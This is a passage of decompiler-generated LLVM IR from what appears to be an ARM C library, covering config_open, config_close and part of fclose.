  %v0_15e1c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15e1c

dec_label_pc_15e1c:                               ; preds = %.dec_label_pc_15e1c_crit_edge, %dec_label_pc_15e08
  %v0_15e1c = phi i32 [ %v0_15e1c.pre, %.dec_label_pc_15e1c_crit_edge ], [ %v3_15e08, %dec_label_pc_15e08 ]
  %v2_15e1c = icmp eq i32 %v0_15e1c, 0
  store i1 %v2_15e1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15e1c, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_15e1c
  %v1_15e20 = load i32, i32* @fp, align 4
  %v2_15e20 = trunc i32 %v1_15e20 to i8
  %v3_15e20 = load i32, i32* @r4, align 4
  %v4_15e20 = inttoptr i32 %v3_15e20 to i8*
  store i8 %v2_15e20, i8* %v4_15e20, align 1
  %v5_15e20 = load i32, i32* @r4, align 4
  %v6_15e20 = add i32 %v5_15e20, 1
  store i32 %v6_15e20, i32* @r4, align 4
  br label %bb71

bb71:                                             ; preds = %bb69, %dec_label_pc_15e1c, %bb70
  %v2_15e24 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_15e24, i32* %r3.global-to-local, align 4
  %v2_15e28 = icmp eq i32 %v2_15e24, 0
  store i1 %v2_15e28, i1* %cpsr_z.global-to-local, align 1
  %v0_15e44.pre = load i32, i32* @r4, align 4
  br i1 %v2_15e28, label %dec_label_pc_15e40, label %dec_label_pc_15e30

dec_label_pc_15e30:                               ; preds = %bb71
  store i32 %v0_15e44.pre, i32* @r0, align 4
  %v0_15e34 = load i32, i32* @sl, align 4
  %v2_15e38 = inttoptr i32 %v0_15e44.pre to i8*
  %v3_15e38 = call i32 @__GI_strspn(i8* %v2_15e38, i32 %v0_15e34)
  store i32 %v3_15e38, i32* %r0.global-to-local, align 4
  %v0_15e3c = load i32, i32* @r4, align 4
  %v2_15e3c = add i32 %v0_15e3c, %v3_15e38
  store i32 %v2_15e3c, i32* @r4, align 4
  br label %dec_label_pc_15e40

dec_label_pc_15e40:                               ; preds = %bb71, %dec_label_pc_15e30
  %v0_15e44 = phi i32 [ %v2_15e3c, %dec_label_pc_15e30 ], [ %v0_15e44.pre, %bb71 ]
  %v0_15e40 = load i32, i32* @r6, align 4
  %v1_15e40 = add i32 %v0_15e40, 1
  store i32 %v1_15e40, i32* @r6, align 4
  %v1_15e44 = inttoptr i32 %v0_15e44 to i8*
  %v2_15e44 = load i8, i8* %v1_15e44, align 1
  %v3_15e44 = zext i8 %v2_15e44 to i32
  store i32 %v3_15e44, i32* %r2.global-to-local, align 4
  %v2_15e48 = icmp eq i8 %v2_15e44, 0
  store i1 %v2_15e48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15e48, label %dec_label_pc_15e60, label %dec_label_pc_15e50

dec_label_pc_15e50:                               ; preds = %dec_label_pc_15d6c, %dec_label_pc_15e40
  %v0_15d9c = phi i32 [ %v0_15e44, %dec_label_pc_15e40 ], [ %v0_15e4412, %dec_label_pc_15d6c ]
  %v2_15d9c = phi i32 [ %v1_15e40, %dec_label_pc_15e40 ], [ %v0_15d84, %dec_label_pc_15d6c ]
  %v1_15e54 = phi i32 [ %v3_15e44, %dec_label_pc_15e40 ], [ %v3_15e4415, %dec_label_pc_15d6c ]
  %v0_15e50 = load i32, i32* @r7, align 4
  %v1_15e50 = inttoptr i32 %v0_15e50 to i8*
  %v2_15e50 = load i8, i8* %v1_15e50, align 1
  %v3_15e50 = zext i8 %v2_15e50 to i32
  store i32 %v3_15e50, i32* %r3.global-to-local, align 4
  %v9_15e54 = icmp eq i32 %v3_15e50, %v1_15e54
  store i1 %v9_15e54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15e54, label %dec_label_pc_15e60, label %bb72

bb72:                                             ; preds = %dec_label_pc_15e50
  %v2_15e58 = load i32, i32* @sb, align 4
  %v3_15e58 = sub i32 %v2_15d9c, %v2_15e58
  %v5_15e58 = xor i32 %v2_15e58, %v2_15d9c
  %v6_15e58 = xor i32 %v3_15e58, %v2_15d9c
  %v7_15e58 = and i32 %v6_15e58, %v5_15e58
  %v8_15e58 = icmp slt i32 %v7_15e58, 0
  %v9_15e58 = icmp slt i32 %v3_15e58, 0
  %v10_15e58 = icmp eq i32 %v2_15d9c, %v2_15e58
  store i1 %v10_15e58, i1* %cpsr_z.global-to-local, align 1
  %v2_15e5c = xor i1 %v9_15e58, %v8_15e58
  br i1 %v2_15e5c, label %dec_label_pc_15d8c, label %dec_label_pc_15e60

dec_label_pc_15e60:                               ; preds = %dec_label_pc_15e50, %dec_label_pc_15e40, %bb72, %dec_label_pc_15d6c
  %v0_15e64 = phi i32 [ %v0_15d84, %dec_label_pc_15d6c ], [ %v2_15d9c, %dec_label_pc_15e50 ], [ %v1_15e40, %dec_label_pc_15e40 ], [ %v2_15d9c, %bb72 ]
  store i32 %v3_15b84, i32* %r2.global-to-local, align 4
  %v9_15e64 = icmp eq i32 %v0_15e64, %v3_15b84
  store i1 %v9_15e64, i1* %cpsr_z.global-to-local, align 1
  %v6_15e68 = icmp slt i32 %v0_15e64, %v3_15b84
  br i1 %v6_15e68, label %dec_label_pc_15e6c, label %dec_label_pc_15e78

dec_label_pc_15e6c:                               ; preds = %dec_label_pc_15e60
  %v0_15e6c = load i32, i32* @r8, align 4
  %v1_15e6c = and i32 %v0_15e6c, 1048576
  %v2_15e6c = icmp eq i32 %v1_15e6c, 0
  store i1 %v2_15e6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15e6c, label %dec_label_pc_15bc4.backedge, label %dec_label_pc_15e74

dec_label_pc_15e74:                               ; preds = %dec_label_pc_15e6c, %dec_label_pc_15d2c, %.thread, %entry
  br label %dec_label_pc_15e78

dec_label_pc_15e78:                               ; preds = %dec_label_pc_15e60, %dec_label_pc_15c48, %dec_label_pc_15e74
  %v0_15e78 = phi i32 [ %v0_15c58, %dec_label_pc_15c48 ], [ 0, %dec_label_pc_15e74 ], [ %v0_15e64, %dec_label_pc_15e60 ]
  store i32 %v0_15e78, i32* %r0.global-to-local, align 4
  store i32 %v3_15b60, i32* @r4, align 4
  store i32 %v6_15b60, i32* @r5, align 4
  store i32 %v9_15b60, i32* @r6, align 4
  store i32 %v12_15b60, i32* @r7, align 4
  store i32 %v15_15b60, i32* @r8, align 4
  store i32 %v18_15b60, i32* @sb, align 4
  store i32 %v21_15b60, i32* @sl, align 4
  store i32 %v24_15b60, i32* @fp, align 4
  ret i32 %v0_15e78

; uselistorder directives
  uselistorder i32 %v0_15e78, { 1, 0 }
  uselistorder i32 %v0_15e64, { 0, 2, 1 }
  uselistorder i32 %v3_15e58, { 1, 0 }
  uselistorder i32 %v2_15e58, { 1, 0, 2 }
  uselistorder i32 %v2_15d9c, { 0, 1, 7, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_15e44.pre, { 0, 2, 1 }
  uselistorder i32 %v5_15dd8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15d84, { 1, 0, 2 }
  uselistorder i1 %v9_15d64, { 1, 0 }
  uselistorder i32 %v3_15d3c, { 0, 2, 1, 3 }
  uselistorder i1 %v7_15d2c, { 1, 0 }
  uselistorder i1 %v8_15d24, { 1, 0 }
  uselistorder i32 %v3_15cf4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_15ce4, { 3, 2, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 %v5_15ccc, { 1, 0, 2 }
  uselistorder i32 %v1_15cbc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15ca8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_15ca0, { 1, 0 }
  uselistorder i32 %v1_15c8c, { 1, 0 }
  uselistorder i32 %v1_15c88, { 1, 0 }
  uselistorder i32 %v2_15c64, { 1, 0 }
  uselistorder i32 %v1_15c48, { 2, 0, 1 }
  uselistorder i32 %v0_15c30, { 1, 0 }
  uselistorder i32 %v1_15c20, { 0, 2, 1 }
  uselistorder i32* %v1_15d90, { 1, 0 }
  uselistorder i1 %v2_15d38, { 1, 0, 2, 3 }
  uselistorder i32 %v1_15bac, { 2, 0, 1, 3 }
  uselistorder i32 %v1_15ba0, { 2, 1, 0 }
  uselistorder i32 %v3_15b88, { 1, 2, 0 }
  uselistorder i32 %v3_15b84, { 2, 1, 0 }
  uselistorder i32 %v1_15b7c, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 8, 3, 4, 5, 6, 7, 1, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 27, 26, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 12, 13, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i32 (i32*, i32, i32, i32)* @realloc, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 (i8*)* @strlen, { 1, 0 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_15e78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15e60, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_15e50, { 1, 0 }
  uselistorder label %dec_label_pc_15e40, { 1, 0 }
  uselistorder label %bb71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15df4, { 1, 0 }
  uselistorder label %dec_label_pc_15bc4.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15d54, { 1, 0 }
  uselistorder label %dec_label_pc_15d2c, { 1, 0 }
  uselistorder label %dec_label_pc_15d20, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15ce4, { 1, 0 }
  uselistorder label %dec_label_pc_15c18, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_15e8c = icmp eq i32* %arg1, null
  br i1 %v2_15e8c, label %dec_label_pc_15eb4, label %dec_label_pc_15e94

dec_label_pc_15e94:                               ; preds = %entry
  %v2_15e94 = load i32, i32* %arg1, align 4
  %v1_15e98 = inttoptr i32 %v2_15e94 to i16*
  %v2_15e98 = call i32 @__GI_fclose(i16* %v1_15e98)
  %v0_15e9c = load i32, i32* @r4, align 4
  %v1_15e9c = add i32 %v0_15e9c, 20
  %v2_15e9c = inttoptr i32 %v1_15e9c to i32*
  %v3_15e9c = load i32, i32* %v2_15e9c, align 4
  %v2_15ea0 = icmp eq i32 %v3_15e9c, 0
  br i1 %v2_15ea0, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_15e94
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_15e94, %bb
  store i32 89772, i32* @lr, align 4
  %v1_15ea8 = xor i1 %v2_15ea0, true
  call void @__pseudo_cond_branch(i1 %v1_15ea8, i32 ptrtoint (i32* @global_var_1357c.35 to i32))
  %v0_15eac = load i32, i32* @r4, align 4
  store i32 %v0_15eac, i32* @r0, align 4
  %v0_15eb0 = call i32 @free()
  br label %dec_label_pc_15eb4

dec_label_pc_15eb4:                               ; preds = %entry, %bb6
  %v1_15eb8 = phi i32 [ 0, %entry ], [ %v0_15eb0, %bb6 ]
  ret i32 %v1_15eb8

; uselistorder directives
  uselistorder label %dec_label_pc_15eb4, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15ec8 = load i32, i32* @r4, align 4
  store i32 %v3_15ec8, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 -33972), i32* @r1, align 4
  %v0_15ed0 = call i32 @__GI_fopen()
  store i32 %v0_15ed0, i32* %r0.global-to-local, align 4
  store i32 %v0_15ed0, i32* @r4, align 4
  %v2_15ed4 = icmp eq i32 %v0_15ed0, 0
  br i1 %v2_15ed4, label %bb, label %dec_label_pc_15ee0

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_15ee0:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_15ee8 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_15ee8, i32* %r0.global-to-local, align 4
  %v2_15eec = icmp eq i32 %v2_15ee8, 0
  br i1 %v2_15eec, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_15ee0
  %v1_15ef0 = load i32, i32* @r4, align 4
  %v3_15ef0 = inttoptr i32 %v2_15ee8 to i32*
  store i32 %v1_15ef0, i32* %v3_15ef0, align 4
  %v1_15ef8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_15ee0, %bb4
  %v1_15ef8 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_15ee0 ], [ %v1_15ef8.pre, %bb4 ]
  %v2_15ef4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15ef4, i32* @r4, align 4
  ret i32 %v1_15ef8

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 (i32, i32)* @calloc, { 41, 38, 39, 40, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 1, 0, 26, 25, 24, 23, 3, 2, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_15f04 = load i32, i32* @r4, align 4
  store i32 %v3_15f04, i32* %stack_var_-36, align 4
  %v6_15f04 = load i32, i32* @r5, align 4
  %v9_15f04 = load i32, i32* @r6, align 4
  %v12_15f04 = load i32, i32* @r7, align 4
  %v2_15f08 = add i32 %tmp, 52
  %v3_15f08 = inttoptr i32 %v2_15f08 to i32*
  %v4_15f08 = load i32, i32* %v3_15f08, align 4
  store i32 %v4_15f08, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15f10 = icmp eq i32 %v4_15f08, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* @r8, align 4
  br i1 %v2_15f10, label %dec_label_pc_15f24, label %dec_label_pc_15f88

dec_label_pc_15f24:                               ; preds = %entry
  %v0_15f24 = call i32 @__aeabi_read_tp()
  store i32 %v0_15f24, i32* %r0.global-to-local, align 4
  %v0_15f28 = load i32, i32* @r5, align 4
  %v1_15f28 = add i32 %v0_15f28, 64
  %v2_15f28 = inttoptr i32 %v1_15f28 to i32*
  %v3_15f28 = load i32, i32* %v2_15f28, align 4
  store i32 %v3_15f28, i32* %r3.global-to-local, align 4
  %v1_15f2c = add i32 %v0_15f24, -1168
  store i32 %v1_15f2c, i32* @r6, align 4
  %v3_15f30 = icmp uge i32 %v3_15f28, %v1_15f2c
  store i1 %v3_15f30, i1* %cpsr_c.global-to-local, align 1
  %v9_15f30 = icmp eq i32 %v3_15f28, %v1_15f2c
  br i1 %v9_15f30, label %dec_label_pc_15f7c, label %dec_label_pc_15f38

dec_label_pc_15f38:                               ; preds = %dec_label_pc_15f24
  %v1_15f38 = add i32 %v0_15f28, 56
  store i32 %v1_15f38, i32* @r7, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_15f38, i32* %r2.global-to-local, align 4
  %v0_15f44 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_15f44, i32* @r4, align 4
  %v1_15f48115 = inttoptr i32 %v1_15f38 to i32*
  %v2_15f48116 = load i32, i32* %v1_15f48115, align 4
  store i32 %v2_15f48116, i32* %r3.global-to-local, align 4
  %v3_15f4c118 = icmp uge i32 %v2_15f48116, %v0_15f44
  store i1 %v3_15f4c118, i1* %cpsr_c.global-to-local, align 1
  %v9_15f4c124 = icmp eq i32 %v2_15f48116, %v0_15f44
  br i1 %v9_15f4c124, label %dec_label_pc_15f54, label %dec_label_pc_15f6c

dec_label_pc_15f54:                               ; preds = %dec_label_pc_15f38, %dec_label_pc_15f54.dec_label_pc_15f48_crit_edge
  %v0_15f54125 = phi i32 [ %v1_15f4c.pre, %dec_label_pc_15f54.dec_label_pc_15f48_crit_edge ], [ %v0_15f44, %dec_label_pc_15f38 ]
  store i32 %v0_15f54125, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15f64 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15f64, label %dec_label_pc_15f68, label %dec_label_pc_15f54.dec_label_pc_15f48_crit_edge

dec_label_pc_15f54.dec_label_pc_15f48_crit_edge:  ; preds = %dec_label_pc_15f54
  %v0_15f48.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15f4c.pre = load i32, i32* @r4, align 4
  %v1_15f48 = inttoptr i32 %v0_15f48.pre to i32*
  %v2_15f48 = load i32, i32* %v1_15f48, align 4
  store i32 %v2_15f48, i32* %r3.global-to-local, align 4
  %v3_15f4c = icmp uge i32 %v2_15f48, %v1_15f4c.pre
  store i1 %v3_15f4c, i1* %cpsr_c.global-to-local, align 1
  %v9_15f4c = icmp eq i32 %v2_15f48, %v1_15f4c.pre
  br i1 %v9_15f4c, label %dec_label_pc_15f54, label %dec_label_pc_15f6c

dec_label_pc_15f68:                               ; preds = %dec_label_pc_15f54
  %v0_15f68 = load i32, i32* @r4, align 4
  store i32 %v0_15f68, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15f6c

dec_label_pc_15f6c:                               ; preds = %dec_label_pc_15f38, %dec_label_pc_15f54.dec_label_pc_15f48_crit_edge, %dec_label_pc_15f68
  %v0_15f6c = phi i32 [ %v0_15f68, %dec_label_pc_15f68 ], [ %v2_15f48116, %dec_label_pc_15f38 ], [ %v2_15f48, %dec_label_pc_15f54.dec_label_pc_15f48_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15f6c = icmp eq i32 %v0_15f6c, 0
  br i1 %v2_15f6c, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_15f6c
  %v1_15f70 = load i32, i32* @r7, align 4
  store i32 %v1_15f70, i32* %r0.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_15f6c, %bb
  %v1_15f74 = xor i1 %v2_15f6c, true
  call void @__pseudo_cond_branch(i1 %v1_15f74, i32 ptrtoint (i32* @global_var_14734.518 to i32))
  %v0_15f78 = load i32, i32* @r6, align 4
  %v1_15f78 = load i32, i32* @r5, align 4
  %v2_15f78 = add i32 %v1_15f78, 64
  %v3_15f78 = inttoptr i32 %v2_15f78 to i32*
  store i32 %v0_15f78, i32* %v3_15f78, align 4
  %v0_15f7c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15f7c

dec_label_pc_15f7c:                               ; preds = %dec_label_pc_15f24, %bb41
  %v0_15f7c = phi i32 [ %v0_15f28, %dec_label_pc_15f24 ], [ %v0_15f7c.pre, %bb41 ]
  %v1_15f7c = add i32 %v0_15f7c, 60
  %v2_15f7c = inttoptr i32 %v1_15f7c to i32*
  %v3_15f7c = load i32, i32* %v2_15f7c, align 4
  %v1_15f80 = add i32 %v3_15f7c, 1
  store i32 %v1_15f80, i32* %r3.global-to-local, align 4
  store i32 %v1_15f80, i32* %v2_15f7c, align 4
  %v0_15f88.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15f88

dec_label_pc_15f88:                               ; preds = %entry, %dec_label_pc_15f7c
  %v1_15f90 = phi i32 [ %tmp, %entry ], [ %v0_15f88.pre, %dec_label_pc_15f7c ]
  %v1_15f88 = inttoptr i32 %v1_15f90 to i16*
  %v2_15f88 = load i16, i16* %v1_15f88, align 2
  %v3_15f88 = zext i16 %v2_15f88 to i32
  store i32 %v3_15f88, i32* %r3.global-to-local, align 4
  %v1_15f8c = and i32 %v3_15f88, 64
  %v2_15f8c = icmp eq i32 %v1_15f8c, 0
  br i1 %v2_15f8c, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_15f88
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_15f88, %bb42
  %storemerge = phi i32 [ %v1_15f90, %bb42 ], [ %v1_15f8c, %dec_label_pc_15f88 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 90008, i32* @lr, align 4
  %v1_15f94 = xor i1 %v2_15f8c, true
  call void @__pseudo_cond_branch(i1 %v1_15f94, i32 ptrtoint (i32* @global_var_16dd8.611 to i32))
  %v0_15f98 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15f98, i32* %fp.global-to-local, align 4
  %v0_15f9c = load i32, i32* @r5, align 4
  %v1_15f9c = add i32 %v0_15f9c, 4
  %v2_15f9c = inttoptr i32 %v1_15f9c to i32*
  %v3_15f9c = load i32, i32* %v2_15f9c, align 4
  store i32 %v3_15f9c, i32* %r0.global-to-local, align 4
  %v1_15fa0 = call i32 @__GI___libc_close(i32 %v3_15f9c)
  store i32 %v1_15fa0, i32* %r0.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15fa8 = load i32, i32* @r8, align 4
  %v2_15fa8 = add i32 %v0_15fa8, 160
  %v3_15fa8 = inttoptr i32 %v2_15fa8 to i32*
  %v4_15fa8 = load i32, i32* %v3_15fa8, align 4
  store i32 %v4_15fa8, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_15fac = icmp slt i32 %v1_15fa0, 0
  br i1 %v1_15fac, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  store i32 -1, i32* %fp.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_15fb4 = add i32 %v4_15fa8, 8
  %v2_15fb4 = inttoptr i32 %v1_15fb4 to i32*
  %v3_15fb4 = load i32, i32* %v2_15fb4, align 4
  store i32 %v3_15fb4, i32* %r3.global-to-local, align 4
  %v0_15fb8 = call i32 @__aeabi_read_tp()
  store i32 %v0_15fb8, i32* %r0.global-to-local, align 4
  %v1_15fbc = add i32 %v0_15fb8, -1168
  store i32 %v1_15fbc, i32* %sl.global-to-local, align 4
  %v0_15fc0 = load i32, i32* %r3.global-to-local, align 4
  %v3_15fc0 = icmp uge i32 %v0_15fc0, %v1_15fbc
  store i1 %v3_15fc0, i1* %cpsr_c.global-to-local, align 1
  %v9_15fc0 = icmp eq i32 %v0_15fc0, %v1_15fbc
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_15fc8 = load i32, i32* @r5, align 4
  %v2_15fc8 = add i32 %v1_15fc8, 4
  %v3_15fc8 = inttoptr i32 %v2_15fc8 to i32*
  store i32 -1, i32* %v3_15fc8, align 4
  br i1 %v9_15fc0, label %dec_label_pc_16010, label %dec_label_pc_15fd0

dec_label_pc_15fd0:                               ; preds = %bb45
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_15fd4 = load i32, i32* @r7, align 4
  store i32 %v0_15fd4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_15fdc108 = inttoptr i32 %v0_15fd4 to i32*
  %v2_15fdc109 = load i32, i32* %v1_15fdc108, align 4
  store i32 %v2_15fdc109, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_15fe0111 = icmp eq i32 %v2_15fdc109, 0
  br i1 %v9_15fe0111, label %dec_label_pc_15fe8, label %dec_label_pc_16000

dec_label_pc_15fe8:                               ; preds = %dec_label_pc_15fd0, %dec_label_pc_15fe8.dec_label_pc_15fdc_crit_edge
  %v0_15fe8112 = phi i32 [ %v1_15fe0.pre, %dec_label_pc_15fe8.dec_label_pc_15fdc_crit_edge ], [ 0, %dec_label_pc_15fd0 ]
  store i32 %v0_15fe8112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15ff8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15ff8, label %dec_label_pc_15ffc, label %dec_label_pc_15fe8.dec_label_pc_15fdc_crit_edge

dec_label_pc_15fe8.dec_label_pc_15fdc_crit_edge:  ; preds = %dec_label_pc_15fe8
  %v0_15fdc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15fe0.pre = load i32, i32* @r4, align 4
  %v1_15fdc = inttoptr i32 %v0_15fdc.pre to i32*
  %v2_15fdc = load i32, i32* %v1_15fdc, align 4
  store i32 %v2_15fdc, i32* %r3.global-to-local, align 4
  %v3_15fe0 = icmp uge i32 %v2_15fdc, %v1_15fe0.pre
  store i1 %v3_15fe0, i1* %cpsr_c.global-to-local, align 1
  %v9_15fe0 = icmp eq i32 %v2_15fdc, %v1_15fe0.pre
  br i1 %v9_15fe0, label %dec_label_pc_15fe8, label %dec_label_pc_16000

dec_label_pc_15ffc:                               ; preds = %dec_label_pc_15fe8
  %v0_15ffc = load i32, i32* @r4, align 4
  store i32 %v0_15ffc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16000

dec_label_pc_16000:                               ; preds = %dec_label_pc_15fd0, %dec_label_pc_15fe8.dec_label_pc_15fdc_crit_edge, %dec_label_pc_15ffc
  %v0_16000 = phi i32 [ %v0_15ffc, %dec_label_pc_15ffc ], [ %v2_15fdc109, %dec_label_pc_15fd0 ], [ %v2_15fdc, %dec_label_pc_15fe8.dec_label_pc_15fdc_crit_edge ]
  %v1_16000 = phi i32 [ %v0_15ffc, %dec_label_pc_15ffc ], [ 0, %dec_label_pc_15fd0 ], [ %v1_15fe0.pre, %dec_label_pc_15fe8.dec_label_pc_15fdc_crit_edge ]
  %v3_16000 = icmp uge i32 %v0_16000, %v1_16000
  store i1 %v3_16000, i1* %cpsr_c.global-to-local, align 1
  %v9_16000 = icmp eq i32 %v0_16000, %v1_16000
  br i1 %v9_16000, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_16000
  %v1_16004 = load i32, i32* @r7, align 4
  store i32 %v1_16004, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_16000, %bb46
  %v1_16008 = xor i1 %v9_16000, true
  call void @__pseudo_cond_branch(i1 %v1_16008, i32 ptrtoint (i32* @global_var_14734.518 to i32))
  %v0_1600c = load i32, i32* %sl.global-to-local, align 4
  %v1_1600c = load i32, i32* @r7, align 4
  %v2_1600c = add i32 %v1_1600c, 8
  %v3_1600c = inttoptr i32 %v2_1600c to i32*
  store i32 %v0_1600c, i32* %v3_1600c, align 4
  br label %dec_label_pc_16010

dec_label_pc_16010:                               ; preds = %bb45, %bb47
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16014 = load i32, i32* @r8, align 4
  %v2_16014 = add i32 %v0_16014, 160
  %v3_16014 = inttoptr i32 %v2_16014 to i32*
  %v4_16014 = load i32, i32* %v3_16014, align 4
  store i32 %v4_16014, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1601c = add i32 %v0_16014, 12
  %v3_1601c = inttoptr i32 %v2_1601c to i32*
  %v4_1601c = load i32, i32* %v3_1601c, align 4
  store i32 %v4_1601c, i32* %r2.global-to-local, align 4
  %v1_16020 = add i32 %v4_16014, 4
  %v2_16020 = inttoptr i32 %v1_16020 to i32*
  %v3_16020 = load i32, i32* %v2_16020, align 4
  store i32 %v3_16020, i32* %r1.global-to-local, align 4
  %v1_16024 = inttoptr i32 %v4_1601c to i32*
  %v2_16024 = load i32, i32* %v1_16024, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16028 = icmp eq i32 %v3_16020, 0
  %v1_1602c = add i32 %v2_16024, 1
  store i32 %v1_1602c, i32* %r3.global-to-local, align 4
  store i32 %v1_1602c, i32* %v1_16024, align 4
  br i1 %v2_16028, label %dec_label_pc_16038, label %dec_label_pc_16098

dec_label_pc_16038:                               ; preds = %dec_label_pc_16010
  %v0_16038 = load i32, i32* %r1.global-to-local, align 4
  %v1_16038 = load i32, i32* %r0.global-to-local, align 4
  %v2_16038 = add i32 %v1_16038, 8
  %v3_16038 = inttoptr i32 %v2_16038 to i32*
  store i32 %v0_16038, i32* %v3_16038, align 4
  %v0_1603c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1603c, i32* @r7, align 4
  br label %dec_label_pc_16040

dec_label_pc_16040:                               ; preds = %dec_label_pc_16070.dec_label_pc_16040_crit_edge, %dec_label_pc_16038
